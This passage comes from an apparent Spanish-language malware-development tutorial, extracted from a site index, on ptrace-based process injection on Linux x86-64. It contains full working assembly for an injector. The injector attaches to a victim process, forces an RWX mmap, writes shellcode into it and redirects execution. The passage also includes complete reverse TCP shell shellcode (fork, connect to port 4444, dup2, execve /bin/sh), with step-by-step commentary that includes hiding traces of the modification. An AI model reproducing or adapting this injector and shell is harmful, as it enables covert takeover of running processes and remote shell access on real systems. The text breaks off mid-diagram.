flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)\n        mov qword [regs+0x48],-1       ; (R8)       r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica \"no file\")\n        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)\n\n    ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n; -----------------------------------------\n\n\n; 5 Ejecuci\u00f3n controlada de la syscall MMAP\n\n    ;PTRACE_SINGLESTEP\n    mov rax, 101\n    mov rdi, 9       ; PTRACE_SINGLESTEP\n    mov rsi, r15     ; PID\n    xor rdx, rdx     ; addr\n    xor r10, r10     ; data\n    syscall\n\n    ; WAIT4: \n    mov rax, 61\n    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n    sub rsp, 8\n    mov rsi, rsp            ; &amp;status\n    xor rdx, rdx            ; options\n    xor r10, r10            ; rusage\n    syscall\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n\n; -----------------------------------------\n\n\n; 6 Obtenci\u00f3n del resultado de la syscall MMAP\n\n\n    xor r12, r12 \n    mov r12, [regs_sys+0x50]       ; (RAX) direcci\u00f3n donde comienza la zona de memoria reservada com permisos RWX\n\n\n; -----------------------------------------\n\n; 7 Restauraci\u00f3n del contenido ubicado en la direcci\u00f3n a la que apunta el registro RIP del tracee\n\n        xor r14, r14\n        mov r14, [regs_ori+0x80]\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r14   ; addr \n        mov r10, r13   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Comprobaci\u00f3n de que se haya restaurado el bytearray de manera adecuada\n        ; PTRACE_PEEKDATA (leer memoria)\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;mov rdx, r14     ; addr\n        ;sub rsp, 8\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n; -----------------------------------------\n\n\n; 8 Restauraci\u00f3n de los registros originales del proceso tracee\n\n\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n\n; -----------------------------------------\n\n; 9 Almacenamiento del RIP de retorno en los \u00faltimos 8 bytes de la regi\u00f3n de memoria reservada por MMAP\n\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        lea rdx, [r12+4088]   ; addr \n        mov r10, r14   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Verificar que se ha escrito el valor del RIP de retorno en la regi\u00f3n de memoria reservada por MMAP\n\n        ; PTRACE_PEEKDATA\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;lea rdx, [r12+4088]     ; addr\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n\n\n; -----------------------------------------\n\n; 10 Inyecci\u00f3n del shellcode en la zona de memoria reservada\n\n    xor r13,r13\n    lea r13, [rel shellcode]   ; puntero al shellcode\n    xor r14, r14\n    mov r14, sc_len / 8        ; contador de palabras a escribir\n    push r12\n\n    .loop_inj:\n\n        cmp r14, 0     ; compara el contador de palabras a escribir con 0\n        jz .done       ; si contador == 0, saltar a .done\n\n        ; PTRACE_POKEDATA\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r12   ; addr \n        mov r10, [r13] ; valor de 8 bytes a escribir\n        syscall\n\n        add r12, 8\n        add r13, 8\n        dec r14\n        jmp .loop_inj\n\n\n; -----------------------------------------\n\n    .done\n\n        ; Verificar que el shellcode se escribi\u00f3 bien\n        ;mov rax, 101\n        ;mov rdi, 2          ; PTRACE_PEEKDATA\n        ;mov rsi, r15\n        ;mov rdx, r12        ; direcci\u00f3n mmap\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n        pop r12\n\n        mov qword [regs_ori+0x80], r12   ; RIP == direcci\u00f3n del inicio de la memoria reservada == inicio del shellcode\n        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)\n\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n\n\n    ; PTRACE_DETACH\n    mov rax, 101\n    mov rdi, 17    ; PTRACE_DETACH\n    mov rsi, r15   ; PID\n    xor rdx, rdx   ; addr\n    xor r10, r10   ; signal = 0 (no enviar se\u00f1al)\n    syscall\n\n\n    ; EXIT\n    mov rax, 60\n    xor rdi,rdi \n    syscall\n\n\n\n;Explicar fork, setsid y munmap\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#explicacion-detallada-del-codigo","title":"Explicaci\u00f3n detallada del c\u00f3digo","text":""},{"location":"research/malware-dev/ptrace-injection/#seccion-data-el-shellcode-embebido","title":"Secci\u00f3n .data - El shellcode embebido","text":"<pre><code>section .data\nshellcode:\n    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    ; ... m\u00e1s bytes ...\nsc_len equ $ - shellcode\n</code></pre> <p>Esta secci\u00f3n contiene el shellcode en formato de bytes crudos. Es el c\u00f3digo que ser\u00e1 inyectado en el proceso v\u00edctima. El shellcode est\u00e1 pre-compilado y representa el programa <code>proc_inj_rev_tcp.asm</code> que veremos m\u00e1s adelante.</p> <p><code>sc_len</code> calcula autom\u00e1ticamente el tama\u00f1o del shellcode usando la directiva <code>$</code> (direcci\u00f3n actual) menos la direcci\u00f3n de inicio.</p>"},{"location":"research/malware-dev/ptrace-injection/#seccion-bss-buffers-para-registros","title":"Secci\u00f3n .bss - Buffers para registros","text":"<pre><code>section .bss\n    regs resq 27      ; Buffer para registros actuales\n    regs_ori resq 27  ; Backup de registros originales\n    regs_sys resq 27  ; Registros despu\u00e9s de syscall\n</code></pre> <p>Reservamos tres buffers de 27 qwords (216 bytes) cada uno:</p> <ul> <li>regs: Almacena los registros que vamos a modificar.</li> <li>regs_ori: Copia de seguridad de los registros originales.</li> <li>regs_sys: Almacena los registros despu\u00e9s de ejecutar mmap (para obtener el resultado).</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#paso-1-attach-y-detencion-del-proceso","title":"Paso 1: Attach y detenci\u00f3n del proceso","text":"<pre><code>    mov r15, 26559           ; PID del proceso objetivo (cambiar seg\u00fan necesidad)\n\n    ; PTRACE_ATTACH\n    mov rax, 101             ; syscall: ptrace\n    mov rdi, 16              ; request: PTRACE_ATTACH\n    mov rsi, r15             ; pid: proceso objetivo\n    xor rdx, rdx             ; addr: no usado\n    xor r10, r10             ; data: no usado\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Nos adjuntamos al proceso v\u00edctima usando <code>PTRACE_ATTACH</code>. Esto tiene varios efectos:</p> <ol> <li>Establecemos una relaci\u00f3n tracer-tracee con el proceso.</li> <li>El kernel env\u00eda <code>SIGSTOP</code> al proceso v\u00edctima, deteni\u00e9ndolo.</li> <li>Obtenemos permisos para leer/escribir su memoria y registros.</li> </ol> <p>\u00bfPor qu\u00e9 wait4?</p> <pre><code>    mov rax, 61              ; syscall: wait4\n    mov rdi, r15             ; pid: esperar a este proceso espec\u00edfico\n    sub rsp, 8\n    mov rsi, rsp             ; &amp;status: donde guardar el estado\n    xor rdx, rdx             ; options: 0\n    xor r10, r10             ; rusage: NULL\n    syscall\n</code></pre> <p>Despu\u00e9s de <code>PTRACE_ATTACH</code>, el proceso no se detiene inmediatamente. El <code>SIGSTOP</code> es as\u00edncrono. Debemos llamar a <code>wait4</code> para bloquearnos hasta que el proceso est\u00e9 efectivamente detenido. Sin esto, podr\u00edamos intentar manipular un proceso que a\u00fan est\u00e1 ejecut\u00e1ndose, causando comportamiento indefinido.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-2-preservacion-del-contexto-de-ejecucion","title":"Paso 2: Preservaci\u00f3n del contexto de ejecuci\u00f3n","text":"<pre><code>    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12              ; PTRACE_GETREGS\n    mov rsi, r15             ; PID\n    xor rdx, rdx\n    lea r10, [rel regs]      ; Buffer destino\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Obtenemos una copia completa de todos los registros del proceso v\u00edctima. Esto nos da:</p> <ul> <li>El valor actual del RIP (d\u00f3nde est\u00e1 ejecutando).</li> <li>Todos los registros de prop\u00f3sito general.</li> <li>Los flags del CPU.</li> <li>El stack pointer.</li> </ul> <pre><code>    ; Copia de seguridad\n    lea rsi, [rel regs]\n    lea rdi, [rel regs_ori]\n    mov rcx, 27\n    cld\n    rep movsq\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Copiamos los 27 qwords de <code>regs</code> a <code>regs_ori</code> usando <code>rep movsq</code>. Esta es una copia de seguridad que usaremos para:</p> <ol> <li>Restaurar el proceso a su estado original despu\u00e9s de ejecutar mmap.</li> <li>Saber cu\u00e1l era el RIP original para poder volver despu\u00e9s del shellcode.</li> </ol> <p>La instrucci\u00f3n <code>cld</code> asegura que la copia se haga en direcci\u00f3n ascendente (DF=0).</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-3-inyeccion-de-la-instruccion-syscall","title":"Paso 3: Inyecci\u00f3n de la instrucci\u00f3n syscall","text":"<pre><code>    mov r12, [regs+0x80]     ; Obtener RIP del tracee\n</code></pre> <p>Leemos el RIP del proceso v\u00edctima. Esta es la direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n que iba a ejecutar.</p> <pre><code>    ; PTRACE_PEEKDATA - Leer bytes originales\n    mov rax, 101\n    mov rdi, 2               ; PTRACE_PEEKDATA\n    mov rsi, r15\n    mov rdx, r12             ; Direcci\u00f3n a leer (RIP del tracee)\n    sub rsp, 8\n    mov r10, rsp             ; Donde guardar el resultado\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Leemos los 8 bytes que est\u00e1n en la direcci\u00f3n donde apunta el RIP. Estos son las instrucciones que el proceso iba a ejecutar. Necesitamos guardarlos para restaurarlos despu\u00e9s.</p> <pre><code>    mov r11, [rsp]           ; Valor original\n    mov r13, r11             ; Backup en r13\n    and r11, 0xFFFFFFFFFFFF0000  ; Limpiar 2 bytes bajos\n    or r11, 0x000000000000050F   ; Insertar \"syscall\" (0F 05)\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <ol> <li>Guardamos el valor original en R13 (lo necesitaremos para restaurar).</li> <li>Limpiamos los 2 bytes menos significativos del qword.</li> <li>Insertamos los bytes <code>0F 05</code> (instrucci\u00f3n <code>syscall</code> en x86-64).</li> </ol> <p>\u00bfPor qu\u00e9 0x050F y no 0x0F05?</p> <p>Por little-endian. Queremos que en memoria quede <code>0F 05</code>, as\u00ed que el valor en el registro debe ser <code>050F</code> (bytes invertidos).</p> <pre><code>    ; PTRACE_POKEDATA - Escribir syscall\n    mov rax, 101\n    mov rdi, 5               ; PTRACE_POKEDATA\n    mov rsi, r15\n    mov rdx, r12             ; Direcci\u00f3n donde escribir\n    mov r10, r11             ; Valor con \"syscall\" inyectado\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Sobrescribimos los primeros 2 bytes donde apunta el RIP con la instrucci\u00f3n <code>syscall</code>. Ahora, cuando el proceso contin\u00fae, ejecutar\u00e1 <code>syscall</code> en lugar de su instrucci\u00f3n original.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-4-configuracion-de-registros-para-mmap","title":"Paso 4: Configuraci\u00f3n de registros para MMAP","text":"<pre><code>    mov qword [regs+0x50], 9       ; RAX = 9 (syscall mmap)\n    mov qword [regs+0x70], 0       ; RDI = 0 (addr NULL)\n    mov qword [regs+0x68], 4096    ; RSI = 4096 (tama\u00f1o)\n    mov qword [regs+0x60], 7       ; RDX = 7 (RWX)\n    mov qword [regs+0x38], 34      ; R10 = 34 (PRIVATE|ANONYMOUS)\n    mov qword [regs+0x48], -1      ; R8 = -1 (no fd)\n    mov qword [regs+0x40], 0       ; R9 = 0 (offset)\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Configuramos los registros en nuestro buffer para que cuando los apliquemos al tracee, ejecute:</p> <pre><code>mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n</code></pre> <p>Esto reservar\u00e1 4096 bytes de memoria con permisos de lectura, escritura y ejecuci\u00f3n.</p> <p>Desglose de argumentos:</p> Registro Offset Valor Significado RAX 0x50 9 N\u00famero de syscall mmap RDI 0x70 0 addr = NULL (kernel elige) RSI 0x68 4096 length = 4096 bytes RDX 0x60 7 prot = RWX R10 0x38 34 flags = PRIVATE | ANONYMOUS R8 0x48 -1 fd = -1 (no archivo) R9 0x40 0 offset = 0 <pre><code>    ; PTRACE_SETREGS - Aplicar configuraci\u00f3n\n    mov rax, 101\n    mov rdi, 13              ; PTRACE_SETREGS\n    mov rsi, r15\n    xor rdx, rdx\n    lea r10, [rel regs]\n    syscall\n</code></pre> <p>Aplicamos estos registros modificados al proceso v\u00edctima.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-5-ejecucion-controlada-de-la-syscall-mmap","title":"Paso 5: Ejecuci\u00f3n controlada de la syscall MMAP","text":"<pre><code>    ; PTRACE_SINGLESTEP\n    mov rax, 101\n    mov rdi, 9               ; PTRACE_SINGLESTEP\n    mov rsi, r15\n    xor rdx, rdx\n    xor r10, r10\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Le decimos al tracee que ejecute una sola instrucci\u00f3n y se detenga. Esa instrucci\u00f3n es el <code>syscall</code> que inyectamos, que ahora ejecutar\u00e1 <code>mmap</code> con los argumentos que configuramos.</p> <pre><code>    ; WAIT4 - Esperar a que se detenga\n    mov rax, 61\n    mov rdi, r15\n    sub rsp, 8\n    mov rsi, rsp\n    xor rdx, rdx\n    xor r10, r10\n    syscall\n</code></pre> <p>Esperamos a que el proceso se detenga despu\u00e9s de ejecutar la instrucci\u00f3n.</p> <pre><code>    ; PTRACE_GETREGS - Obtener resultado\n    mov rax, 101\n    mov rdi, 12\n    mov rsi, r15\n    xor rdx, rdx\n    lea r10, [rel regs_sys]\n    syscall\n</code></pre> <p>Obtenemos los registros despu\u00e9s de la syscall. El resultado de <code>mmap</code> estar\u00e1 en RAX.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-6-obtencion-del-resultado-de-mmap","title":"Paso 6: Obtenci\u00f3n del resultado de MMAP","text":"<pre><code>    xor r12, r12\n    mov r12, [regs_sys+0x50]    ; RAX contiene la direcci\u00f3n mmap\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Extraemos el valor de RAX del buffer de registros. Este valor es la direcci\u00f3n base de la memoria que acabamos de reservar. Esta memoria tiene permisos RWX, perfecta para nuestro shellcode.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-7-restauracion-de-los-bytes-originales","title":"Paso 7: Restauraci\u00f3n de los bytes originales","text":"<pre><code>    xor r14, r14\n    mov r14, [regs_ori+0x80]    ; RIP original\n\n    ; PTRACE_POKEDATA - Restaurar bytes\n    mov rax, 101\n    mov rdi, 5\n    mov rsi, r15\n    mov rdx, r14               ; Direcci\u00f3n original del RIP\n    mov r10, r13               ; Bytes originales (guardados en paso 3)\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Restauramos los bytes originales que sobrescribimos con <code>syscall</code>. Esto es importante porque:</p> <ol> <li>No queremos dejar rastros de nuestra modificaci\u00f3n.</li> <li>El c\u00f3digo original debe poder ejecutarse si el proceso vuelve a esa direcci\u00f3n.</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#paso-8-restauracion-de-los-registros-originales","title":"Paso 8: Restauraci\u00f3n de los registros originales","text":"<pre><code>    ; PTRACE_SETREGS\n    mov rax, 101\n    mov rdi, 13\n    mov rsi, r15\n    xor rdx, rdx\n    lea r10, [rel regs_ori]\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Restauramos todos los registros del proceso a sus valores originales. En este punto, el proceso est\u00e1 exactamente como estaba antes de que lo toc\u00e1ramos (excepto que ahora tiene una regi\u00f3n de memoria RWX adicional).</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-9-almacenamiento-del-rip-de-retorno","title":"Paso 9: Almacenamiento del RIP de retorno","text":"<pre><code>    ; PTRACE_POKEDATA\n    mov rax, 101\n    mov rdi, 5\n    mov rsi, r15\n    lea rdx, [r12+4088]        ; Final de la p\u00e1gina mmap\n    mov r10, r14               ; RIP original\n    syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Escribimos el RIP original al final de la regi\u00f3n mmap (offset +4088, dejando espacio para los 8 bytes del qword). </p> <p>\u00bfPor qu\u00e9?</p> <p>Nuestro shellcode usa <code>fork()</code>. El proceso padre necesita saber a d\u00f3nde volver despu\u00e9s de ejecutar el shellcode. Guardamos esta direcci\u00f3n de retorno en un lugar conocido (final de la p\u00e1gina mmap) donde el shellcode puede encontrarla.</p>"},{"location":"research/malware-dev/ptrace-injection/#paso-10-inyeccion-del-shellcode","title":"Paso 10: Inyecci\u00f3n del shellcode","text":"<pre><code>    xor r13, r13\n    lea r13, [rel shellcode]   ; Puntero al shellcode\n    xor r14, r14\n    mov r14, sc_len / 8        ; N\u00famero de qwords a escribir\n    push r12                   ; Guardar direcci\u00f3n base\n\n    .loop_inj:\n        cmp r14, 0\n        jz .done\n\n        ; PTRACE_POKEDATA\n        mov rax, 101\n        mov rdi, 5\n        mov rsi, r15\n        mov rdx, r12           ; Direcci\u00f3n destino\n        mov r10, [r13]         ; 8 bytes del shellcode\n        syscall\n\n        add r12, 8             ; Avanzar destino\n        add r13, 8             ; Avanzar origen\n        dec r14                ; Decrementar contador\n        jmp .loop_inj\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Copiamos el shellcode a la memoria RWX del proceso v\u00edctima, 8 bytes a la vez usando <code>PTRACE_POKEDATA</code> en un bucle.</p> <p>\u00bfPor qu\u00e9 un bucle?</p> <p><code>PTRACE_POKEDATA</code> solo puede escribir 8 bytes por llamada. Como nuestro shellcode es m\u00e1s grande, necesitamos m\u00faltiples llamadas.</p>"},{"location":"research/malware-dev/ptrace-injection/#finalizacion-y-detach","title":"Finalizaci\u00f3n y DETACH","text":"<pre><code>    .done:\n        pop r12                           ; Recuperar direcci\u00f3n base\n\n        mov qword [regs_ori+0x80], r12    ; RIP = inicio del shellcode\n        mov qword [regs_ori+0x78], -1     ; orig_rax = -1\n\n        ; PTRACE_SETREGS - Redirigir al shellcode\n        mov rax, 101\n        mov rdi, 13\n        mov rsi, r15\n        xor rdx, rdx\n        lea r10, [rel regs_ori]\n        syscall\n\n        ; PTRACE_DETACH - Liberar proceso\n        mov rax, 101\n        mov rdi, 17\n        mov rsi, r15\n        xor rdx, rdx\n        xor r10, r10\n        syscall\n\n        ; EXIT\n        mov rax, 60\n        xor rdi, rdi\n        syscall\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <ol> <li>Modificar RIP: Cambiamos el RIP para que apunte al inicio de nuestro shellcode.</li> <li>orig_rax = -1: Establecemos <code>orig_rax</code> a -1 para evitar que el kernel intente reiniciar una syscall interrumpida.</li> <li>PTRACE_SETREGS: Aplicamos estos cambios.</li> <li>PTRACE_DETACH: Liberamos el proceso. Este contin\u00faa ejecut\u00e1ndose, pero ahora desde nuestro shellcode.</li> <li>EXIT: El inyector termina su trabajo.</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm","title":"Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)","text":"<p>Este es el shellcode que se inyecta en el proceso v\u00edctima:</p> <pre><code>section .text\nglobal _start\n_start:\n\n\n    ; FORK\n    mov rax, 57\n    syscall\n\n    cmp rax, 0           ; si rax==0 se trata del hijo\n    jz .child            \n\n                            ; r11 porque es un registro clobbered (destruido por las syscalls)\n                                ; por tanto, no se est\u00e1 modificando un registro funcional del proceso tracee\n    lea r11, [rel _start] ; r11 = direcci\u00f3n de _start = mmap_base = RIP inicial del shellcode\n\n\n                            ; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar despu\u00e9s\n\n    ; Proceso Padre\n    mov r14, [r11+4088] ; Obtiene direcci\u00f3n de retorno\n    jmp r14             ; Salta a la direcci\u00f3n de retorno sobreescribiendo el registro RIP\n\n\n.child\n\n\n    ; SETSID\n    mov rax, 112\n    syscall\n\n\n    ; SOCKET\n    mov rax, 41\n    mov rdi, 2 ;IPV4\n    mov rsi, 1 ;TCP\n    xor rdx, rdx ; Default\n    syscall\n\n    ; Store socket FD\n    mov r8, rax\n\n    ; CONNECT\n    mov rax, 42\n    mov rdi, r8\n                    ;   Stack        Low  &lt;----------- High\n    ; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   \n    ;                   \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)\n    ;                   fam   port  IP          padding\n\n    ; Mapeado de los campos de sockaddr_in:\n                        ; Bytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\n                        ; Bytes 2-3:   11 5c           \u2192 sin_port (4444)\n                        ; Bytes 4-7:   7F 00 00 01     \u2192 sin_addr (127.0.0.1)\n                        ; Bytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n    xor r9,r9 ; 0\n    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)\n    mov r10, 0x0100007F5c110002\n    push r10 ; sin_family + sin_port + sin_addr (8 bytes)\n    mov rsi, rsp ; direccion del tope de la pila\n    mov rdx, 16 ;IPV4 (espera 16 bytes)\n    syscall\n\n\n    xor rsi,rsi\n.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket\n    ;DUP2\n    mov rax, 33\n    mov rdi, r8\n    syscall \n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n\n    ; EXEXCVE\n    mov rax, 59\n\n    push 0                       ; null terminator de /bin/sh -&gt; /bin/sh\\0\n    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian\n    push r12                     ; string /bin/sh\n    mov rdi, rsp\n\n    push 0                       ; argv = {NULL}\n    mov rsi, rsp\n\n    push 0                       ; envp = {NULL}\n    mov rdx, rsp\n\n    syscall \n\n.done:\n    ; EXIT\n    mov rax, 60                    ; syscall: exit\n    xor rdi, rdi                   ; exit code = 0 (\u00e9xito)\n    syscall                        \n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#explicacion-del-shellcode","title":"Explicaci\u00f3n del shellcode","text":""},{"location":"research/malware-dev/ptrace-injection/#fork-bifurcacion-del-proceso","title":"fork() - Bifurcaci\u00f3n del proceso","text":"<pre><code>    mov rax, 57\n    syscall\n    cmp rax, 0\n    jz .child\n</code></pre> <p>\u00bfPor qu\u00e9 fork?</p> <p>Si ejecut\u00e1ramos la reverse shell directamente, el proceso v\u00edctima quedar\u00eda \"secuestrado\" ejecutando <code>/bin/sh</code> y no podr\u00eda continuar su trabajo normal. Con fork:</p> <ul> <li>El proceso padre (la v\u00edctima original) puede continuar su ejecuci\u00f3n normal.</li> <li>El proceso hijo se encarga de la reverse shell.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#retorno-del-proceso-padre","title":"Retorno del proceso padre","text":"<pre><code>    lea r11, [rel _start]\n    mov r14, [r11+4088]\n    jmp r14\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <ol> <li>Calcula la direcci\u00f3n base del shellcode usando direccionamiento relativo al RIP.</li> <li>Lee la direcci\u00f3n de retorno que guardamos al final de la p\u00e1gina mmap.</li> <li>Salta a esa direcci\u00f3n, continuando la ejecuci\u00f3n normal del programa v\u00edctima.</li> </ol> <p>\u00bfPor qu\u00e9 R11?</p> <p>R11 es un registro \"clobbered\" por las syscalls (el kernel lo usa para guardar RFLAGS). Por eso lo usamos inmediatamente despu\u00e9s del fork, antes de cualquier otra syscall.</p>"},{"location":"research/malware-dev/ptrace-injection/#setsid-nueva-sesion","title":"setsid() - Nueva sesi\u00f3n","text":"<pre><code>    mov rax, 112\n    syscall\n</code></pre> <p>\u00bfPor qu\u00e9 setsid?</p> <p><code>setsid()</code> crea una nueva sesi\u00f3n y hace que el proceso hijo sea el l\u00edder de esa sesi\u00f3n. Beneficios:</p> <ul> <li>Se desvincula de la terminal controladora original.</li> <li>Se\u00f1ales como SIGHUP no lo afectar\u00e1n cuando el padre termine.</li> <li>La reverse shell ser\u00e1 m\u00e1s estable y persistente.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#socket-crear-socket-tcp","title":"socket() - Crear socket TCP","text":"<pre><code>    mov rax, 41          ; syscall: socket\n    mov rdi, 2           ; AF_INET (IPv4)\n    mov rsi, 1           ; SOCK_STREAM (TCP)\n    xor rdx, rdx         ; protocol = 0 (default)\n    syscall\n    mov r8, rax          ; Guardar fd del socket\n</code></pre> <p>Creamos un socket TCP/IPv4 y guardamos el file descriptor en R8.</p>"},{"location":"research/malware-dev/ptrace-injection/#connect-conectar-al-atacante","title":"connect() - Conectar al atacante","text":"<pre><code>    ; Construir sockaddr_in en el stack\n    xor r9, r9\n    push r9                      ; 8 bytes de padding\n    mov r10, 0x0100007F5c110002  ; familia + puerto + IP\n    push r10\n    mov rsi, rsp\n    mov rdx, 16\n\n    mov rax, 42          ; syscall: connect\n    mov rdi, r8          ; socket fd\n    syscall\n</code></pre> <p>Estructura sockaddr_in:</p> <pre><code>0x0100007F5c110002 en memoria (little-endian):\n02 00 11 5c 7F 00 00 01\n\n02 00       = AF_INET (familia = 2)\n11 5c       = puerto 4444 (0x115C en network byte order)\n7F 00 00 01 = 127.0.0.1\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#dup2-redirigir-io","title":"dup2() - Redirigir I/O","text":"<pre><code>    xor rsi, rsi\n.dup2:\n    mov rax, 33\n    mov rdi, r8          ; socket fd\n    syscall\n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n</code></pre> <p>\u00bfQu\u00e9 hace?</p> <p>Redirige stdin (0), stdout (1) y stderr (2) al socket. Despu\u00e9s de esto, todo lo que se lea/escriba ir\u00e1 por el socket hacia el atacante.</p>"},{"location":"research/malware-dev/ptrace-injection/#execve-ejecutar-shell","title":"execve() - Ejecutar shell","text":"<pre><code>    mov rax, 59\n    push 0\n    mov r12, 0x68732f6e69622f    ; \"/bin/sh\"\n    push r12\n    mov rdi, rsp                 ; argv[0] = \"/bin/sh\"\n    push 0\n    mov rsi, rsp                 ; argv = {NULL}\n    push 0\n    mov rdx, rsp                 ; envp = {NULL}\n    syscall\n</code></pre> <p>Ejecuta <code>/bin/sh</code>. Como stdin/stdout/stderr est\u00e1n redirigidos al socket, el atacante obtiene una shell interactiva.</p>"},{"location":"research/malware-dev/ptrace-injection/#diagrama-de-memoria-post-inyeccion","title":"Diagrama de memoria post-inyecci\u00f3n","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    PROCESO V\u00cdCTIMA                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  C\u00f3digo original del proceso                                \u2502\n\u2502  